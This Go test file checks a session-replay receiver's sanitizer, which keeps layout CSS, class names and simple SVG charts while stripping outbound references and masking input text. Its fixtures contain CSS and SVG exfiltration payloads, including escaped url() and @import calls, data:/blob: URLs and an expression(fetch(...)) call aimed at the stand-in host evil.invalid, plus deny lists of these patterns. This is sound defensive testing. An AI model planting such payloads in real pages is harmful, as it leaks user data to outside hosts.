package rumreplayreceiver

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestReplayPreservesBoundedClassAndVisualCSSWithoutEgress(t *testing.T) {
	raw := json.RawMessage(`{
		"type": 2,
		"id": 1,
		"tagName": "div",
		"attributes": {
			"class": "Card_hash     layout-grid",
			"style": "--gap: 8px; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: var(--gap); color: rgb(10 20 30 / .9); transform: translateX(2px); background-image: url(https://evil.invalid/pixel); transition: all 1s"
		},
		"childNodes": [{
			"type": 2,
			"id": 2,
			"tagName": "style",
			"attributes": {
				"_cssText": ".Card_hash{display:flex;align-items:center}.layout-grid{grid-template-columns:repeat(2,minmax(0,1fr))}@media (min-width:640px){.layout-grid{gap:16px}}@import url(https://evil.invalid/import.css);@keyframes pulse{from{opacity:0}to{opacity:1}}"
			},
			"childNodes": [{
				"type": 3,
				"id": 3,
				"isStyle": true,
				"textContent": ".body-copy{font-size:14px;color:hsl(220 20% 20%)}@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA)}"
			}]
		}, {
			"type": 3,
			"id": 4,
			"textContent": "customer-secret"
		}]
	}`)

	encoded := mustSanitizedNodeJSON(t, raw)
	require.Contains(t, encoded, `"class":"Card_hash layout-grid"`)
	for _, visual := range []string{
		"--gap:8px", "display:grid", "grid-template-columns:repeat(3,minmax(0,1fr))",
		"gap:var(--gap)", "color:rgb(10 20 30/.9)", "transform:translateX(2px)",
		"transition:all 1s",
		".Card_hash{display:flex;align-items:center;}",
		"@media(min-width:640px){.layout-grid{gap:16px;}}",
		"@keyframes pulse{from{opacity:0;}to{opacity:1;}}",
		".body-copy{font-size:14px;color:hsl(220 20% 20%);}",
	} {
		require.Contains(t, encoded, visual)
	}
	require.Contains(t, encoded, `"textContent":"customer-secret"`)
	for _, forbidden := range []string{
		"evil.invalid", "url(", "@import", "@font-face",
		"data:", "blob:", "background-image",
	} {
		require.NotContains(t, encoded, forbidden)
	}
}

func TestReplayClassBoundsAreFailClosed(t *testing.T) {
	valid128ByteToken := strings.Repeat("a", 128)
	valid64Tokens := strings.Repeat("x ", 63) + "x"
	tests := []struct {
		name  string
		value string
		want  string
	}{
		{name: "normalizes spaces", value: "alpha    beta", want: "alpha beta"},
		{name: "printable unicode", value: "按钮-主 grid_哈希", want: "按钮-主 grid_哈希"},
		{name: "maximum token", value: valid128ByteToken, want: valid128ByteToken},
		{name: "maximum token count", value: valid64Tokens, want: valid64Tokens},
		{name: "over total bytes", value: strings.Repeat(valid128ByteToken+" ", 16), want: ""},
		{name: "over token count", value: valid64Tokens + " x", want: ""},
		{name: "over token bytes", value: valid128ByteToken + "a", want: ""},
		{name: "control", value: "alpha\nbeta", want: ""},
		{name: "non printable", value: "alpha\u200bbeta", want: ""},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			encoded, err := json.Marshal(map[string]string{"class": test.value})
			require.NoError(t, err)
			attributes, err := sanitizeAttributes(encoded)
			require.NoError(t, err)
			if test.want == "" {
				require.NotContains(t, attributes, "class")
				return
			}
			require.Equal(t, test.want, attributes["class"])
		})
	}
}

func TestReplayPreservesMinimalSVGChartAndRejectsActiveSVG(t *testing.T) {
	raw := json.RawMessage(`{
		"type": 2,
		"id": 1,
		"tagName": "svg",
		"isSVG": true,
		"attributes": {"viewBox":"0 0 640 320","width":"640","height":"320","preserveAspectRatio":"xMidYMid meet","class":"chart_hash"},
		"childNodes": [{
			"type":2,"id":2,"tagName":"g","isSVG":true,
			"attributes":{"transform":"translate(16 12)","style":"fill:#2563eb;stroke:rgb(15 23 42);stroke-width:2"},
			"childNodes":[
				{"type":2,"id":3,"tagName":"path","isSVG":true,"attributes":{"d":"M0 200 L80 120 C120 80 160 60 220 40 Z","fill":"#2563eb","stroke":"rgb(15 23 42)","stroke-width":"2"},"childNodes":[]},
				{"type":2,"id":4,"tagName":"rect","isSVG":true,"attributes":{"x":"240","y":"80","width":"48","height":"120","rx":"4","fill":"hsl(220 80% 55%)"},"childNodes":[]},
				{"type":2,"id":5,"tagName":"circle","isSVG":true,"attributes":{"cx":"320","cy":"100","r":"8","fill":"currentColor"},"childNodes":[]},
				{"type":2,"id":6,"tagName":"polyline","isSVG":true,"attributes":{"points":"0,220 80,180 160,200","fill":"none","stroke":"#0f172a"},"childNodes":[]},
				{"type":2,"id":7,"tagName":"text","isSVG":true,"attributes":{"x":"0","y":"260","font-size":"12","fill":"#334155"},"childNodes":[{"type":3,"id":8,"textContent":"secret label"}]}
			]
		},
		{"type":2,"id":10,"tagName":"clipPath","isSVG":true,"attributes":{"id":"plot-clip"},"childNodes":[]},
		{"type":2,"id":11,"tagName":"linearGradient","isSVG":true,"attributes":{"id":"gradient","x1":"0","y1":"0","x2":"1","y2":"1"},"childNodes":[{"type":2,"id":12,"tagName":"stop","isSVG":true,"attributes":{"offset":"50%","stop-color":"#fff"},"childNodes":[]}]},
		{"type":2,"id":20,"tagName":"image","isSVG":true,"attributes":{"href":"https://evil.invalid/image"},"childNodes":[]},
		{"type":2,"id":21,"tagName":"foreignObject","isSVG":true,"attributes":{},"childNodes":[]},
		{"type":2,"id":22,"tagName":"filter","isSVG":true,"attributes":{"id":"f"},"childNodes":[]},
		{"type":2,"id":23,"tagName":"animate","isSVG":true,"attributes":{"attributeName":"x","from":"0","to":"1"},"childNodes":[]},
		{"type":2,"id":24,"tagName":"use","isSVG":true,"attributes":{"href":"#remote"},"childNodes":[]},
		{"type":2,"id":25,"tagName":"mask","isSVG":true,"attributes":{"id":"m"},"childNodes":[]},
		{"type":2,"id":26,"tagName":"pattern","isSVG":true,"attributes":{"id":"p"},"childNodes":[]},
		{"type":2,"id":27,"tagName":"path","isSVG":true,"attributes":{"d":"M0 0L1 1","fill":"url(https://evil.invalid/paint)","filter":"url(#f)"},"childNodes":[]}
	]}`)

	encoded := mustSanitizedNodeJSON(t, raw)
	for _, visual := range []string{
		`"tagName":"svg"`, `"tagName":"path"`, `"tagName":"rect"`, `"tagName":"circle"`,
		`"tagName":"polyline"`, `"tagName":"text"`, `"tagName":"clipPath"`,
		`"tagName":"linearGradient"`, `"tagName":"stop"`,
		`"viewBox":"0 0 640 320"`, `"d":"M0 200 L80 120 C120 80 160 60 220 40 Z"`,
		`"transform":"translate(16 12)"`, `"fill":"#2563eb"`,
	} {
		require.Contains(t, encoded, visual)
	}
	for _, forbidden := range []string{
		`"tagName":"image"`, `"tagName":"foreignObject"`, `"tagName":"filter"`,
		`"tagName":"animate"`, `"tagName":"use"`, `"tagName":"mask"`, `"tagName":"pattern"`,
		`"href"`, `"filter"`, "evil.invalid", "url(",
	} {
		require.NotContains(t, encoded, forbidden)
	}
	require.Contains(t, encoded, `"textContent":"secret label"`)
}

func TestReplayUsesOneVisualSanitizerForMutationAndCSSOM(t *testing.T) {
	mutation, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":0,
		"texts":[],
		"attributes":[{"id":2,"attributes":{
			"class":"Panel_hash   grid",
			"style":{"display":"grid","grid-template-columns":["repeat(2,minmax(0,1fr))","important"],"background-image":"url(blob:https://evil.invalid/id)","transition":false},
			"_cssText":".Panel_hash{display:flex;color:#123456}@import url(data:text/css,body{})"
		}}],
		"removes":[],
		"adds":[{"parentId":2,"nextId":null,"node":{"type":2,"id":3,"tagName":"span","attributes":{"class":"Badge_hash","style":"display:inline-flex;color:rgb(1 2 3)"},"childNodes":[]}}]
	}`))
	require.NoError(t, err)
	mutationJSON := mustJSON(t, mutation)
	for _, visual := range []string{
		`"class":"Panel_hash grid"`, `"display":"grid"`,
		`"grid-template-columns":["repeat(2,minmax(0,1fr))","important"]`,
		`.Panel_hash{display:flex;color:#123456;}`, `"class":"Badge_hash"`,
		`display:inline-flex`, `color:rgb(1 2 3)`,
	} {
		require.Contains(t, mutationJSON, visual)
	}
	for _, forbidden := range []string{"background-image", "blob:", "@import", "url("} {
		require.NotContains(t, mutationJSON, forbidden)
	}

	styleRule, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":8,"styleId":7,
		"adds":[
			{"rule":".grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));background-image:u\\72l(https://evil.invalid/a)}","index":0},
			{"rule":"@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA)}","index":1}
		],
		"replace":".flex{display:flex;gap:8px}@media (min-width:600px){.flex{gap:16px}}@keyframes x{from{opacity:0}to{opacity:1}}",
		"removes":[{"index":2}]
	}`))
	require.NoError(t, err)
	styleRuleJSON := mustJSON(t, styleRule)
	for _, visual := range []string{
		`.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));}`,
		`.flex{display:flex;gap:8px;}`, `@media(min-width:600px){.flex{gap:16px;}}`,
		`@keyframes x{from{opacity:0;}to{opacity:1;}}`,
		`"removes":[{"index":2}]`,
	} {
		require.Contains(t, styleRuleJSON, visual)
	}
	for _, forbidden := range []string{"evil.invalid", "url(", "@font-face", "background-image"} {
		require.NotContains(t, styleRuleJSON, forbidden)
	}

	set, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":13,"styleId":7,"index":[0],
		"set":{"property":"grid-template-columns","value":"repeat(2,minmax(0,1fr))","priority":"important"}
	}`))
	require.NoError(t, err)
	require.JSONEq(t, `{
		"source":13,"styleId":7,"index":[0],
		"set":{"property":"grid-template-columns","value":"repeat(2,minmax(0,1fr))","priority":"important"}
	}`, mustJSON(t, set))

	unsafeSet, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":13,"styleId":7,"index":[0],
		"set":{"property":"color","value":"u\\72l(data:text/plain,secret)","priority":null}
	}`))
	require.NoError(t, err)
	require.JSONEq(t, `{"source":13,"styleId":7,"index":[0]}`, mustJSON(t, unsafeSet))

	remove, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":13,"styleId":7,"index":[0],"remove":{"property":"display"}
	}`))
	require.NoError(t, err)
	require.JSONEq(t, `{
		"source":13,"styleId":7,"index":[0],"remove":{"property":"display"}
	}`, mustJSON(t, remove))

	adopted, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":15,"id":1,"styleIds":[7],
		"styles":[{"styleId":7,"rules":[
			{"rule":".stack{display:flex;flex-direction:column;gap:4px}","index":0},
			{"rule":"@import url(https://evil.invalid/adopted.css)","index":1}
		]}]
	}`))
	require.NoError(t, err)
	adoptedJSON := mustJSON(t, adopted)
	require.Contains(t, adoptedJSON, `.stack{display:flex;flex-direction:column;gap:4px;}`)
	require.NotContains(t, adoptedJSON, "evil.invalid")
	require.NotContains(t, adoptedJSON, "@import")
}

func TestReplayCSSParserFailsClosedAndRejectsEscapedEgress(t *testing.T) {
	tests := []struct {
		name  string
		field string
		css   string
		want  string
	}{
		{name: "escaped url", field: "style", css: `color:u\72l(https://evil.invalid/a);display:grid`, want: "display:grid"},
		{name: "data url", field: "style", css: `transform:url(data:text/plain,x);display:flex`, want: "display:flex"},
		{name: "blob url", field: "style", css: `color:url(blob:https://evil.invalid/id);display:block`, want: "display:block"},
		{name: "dangerous function", field: "style", css: `width:expression(fetch('https://evil.invalid'));display:grid`, want: "display:grid"},
		{name: "image set", field: "style", css: `color:image-set("https://evil.invalid/a" 1x);display:grid`, want: "display:grid"},
		{name: "escaped import", field: "_cssText", css: `@\69mport url(https://evil.invalid/a);.safe{display:grid}`, want: "display:grid"},
		{name: "font face", field: "_cssText", css: `@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA)}.safe{display:grid}`, want: "display:grid"},
		{name: "unknown at rule", field: "_cssText", css: `@document url-prefix(){.leak{color:red}}.safe{display:grid}`, want: "display:grid"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			raw, err := json.Marshal(map[string]string{test.field: test.css})
			require.NoError(t, err)
			attributes, err := sanitizeAttributes(raw)
			require.NoError(t, err)
			encoded := mustJSON(t, attributes)
			require.NotContains(t, encoded, "evil.invalid")
			require.NotContains(t, encoded, "url(")
			require.NotContains(t, encoded, "@import")
			require.NotContains(t, encoded, "@font-face")
			require.NotContains(t, encoded, "@document")
			require.Contains(t, encoded, test.want)
		})
	}

	invalidInline, err := sanitizeAttributes(json.RawMessage(`{"style":"display=grid;color:red"}`))
	require.NoError(t, err)
	require.Equal(t, "", invalidInline["style"])

	invalidSheet, err := sanitizeAttributes(json.RawMessage(`{"_cssText":".broken{display:grid"}`))
	require.NoError(t, err)
	require.Equal(t, "", invalidSheet["_cssText"])

	invalidReplace, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":8,"styleId":1,"replace":".broken{display:grid"
	}`))
	require.NoError(t, err)
	require.JSONEq(t, `{"source":8,"styleId":1,"replace":""}`, mustJSON(t, invalidReplace))
}

func TestReplayKeepsOrdinaryTextAndInputMaskedWhileSanitizingStyleText(t *testing.T) {
	styleText := mustSanitizedNodeJSON(t, json.RawMessage(`{
		"type":3,"id":1,"isStyle":true,
		"textContent":".safe{display:grid;color:#123456}.unsafe{color:u\\72l(https://evil.invalid/a)}"
	}`))
	require.Contains(t, styleText, `.safe{display:grid;color:#123456;}`)
	require.NotContains(t, styleText, "evil.invalid")

	ordinaryText := mustSanitizedNodeJSON(t, json.RawMessage(`{
		"type":3,"id":2,"textContent":".looks-like-css{display:grid} customer-secret"
	}`))
	require.Contains(t, ordinaryText, `"textContent":".looks-like-css{display:grid} customer-secret"`)

	input, err := sanitizeIncrementalSnapshot(json.RawMessage(`{
		"source":5,"id":3,"text":"customer-input-secret","isChecked":false,"userTriggered":true
	}`))
	require.NoError(t, err)
	require.NotContains(t, mustJSON(t, input), "customer-input-secret")
}

func TestReplayCheckpointContractAppliesToEverySequence(t *testing.T) {
	meta := json.RawMessage(`{
		"type":4,"timestamp":1784109595000,
		"data":{"href":"https://customer.example/private","width":1280,"height":720}
	}`)
	full := json.RawMessage(`{
		"type":2,"timestamp":1784109595001,
		"data":{"node":{"type":0,"id":1,"childNodes":[]},"initialOffset":{"top":0,"left":0}}
	}`)
	incremental := json.RawMessage(`{
		"type":3,"timestamp":1784109595002,
		"data":{"source":5,"id":6,"text":"","isChecked":false,"userTriggered":true}
	}`)
	secondFull := json.RawMessage(`{
		"type":2,"timestamp":1784109595002,
		"data":{"node":{"type":0,"id":7,"childNodes":[]},"initialOffset":{"top":0,"left":0}}
	}`)

	valid := signedEnvelopeForEvents(t, []json.RawMessage{meta, full, incremental}, true)
	valid.Sequence = 99
	resignTestEnvelope(t, &valid)
	validReceiver, validSink := newReplayTestReceiver(t)
	require.Equal(t, http.StatusAccepted, performReplay(validReceiver, gzipJSON(t, valid), validReplayHeaders()).Code)
	require.Len(t, validSink.AllLogs(), 1)

	tests := []struct {
		name   string
		events []json.RawMessage
		marker bool
	}{
		{name: "nonzero full snapshot before bootstrap", events: []json.RawMessage{full, incremental}, marker: true},
		{name: "nonzero event between bootstrap pair", events: []json.RawMessage{meta, incremental, secondFull}, marker: true},
		{name: "nonzero extra full snapshot", events: []json.RawMessage{meta, full, secondFull}, marker: true},
		{name: "marker false cannot bypass full snapshot", events: []json.RawMessage{meta, full, incremental}, marker: false},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			envelope := signedEnvelopeForEvents(t, test.events, test.marker)
			envelope.Sequence = 99
			resignTestEnvelope(t, &envelope)
			r, sink := newReplayTestReceiver(t)
			require.Equal(t, http.StatusBadRequest, performReplay(r, gzipJSON(t, envelope), validReplayHeaders()).Code)
			require.Empty(t, sink.AllLogs())
		})
	}
}

func mustSanitizedNodeJSON(t testing.TB, raw json.RawMessage) string {
	t.Helper()
	node, err := sanitizeSerializedNode(raw, 0)
	require.NoError(t, err)
	return mustJSON(t, node)
}

func mustJSON(t testing.TB, value any) string {
	t.Helper()
	encoded, err := json.Marshal(value)
	require.NoError(t, err)
	return string(encoded)
}
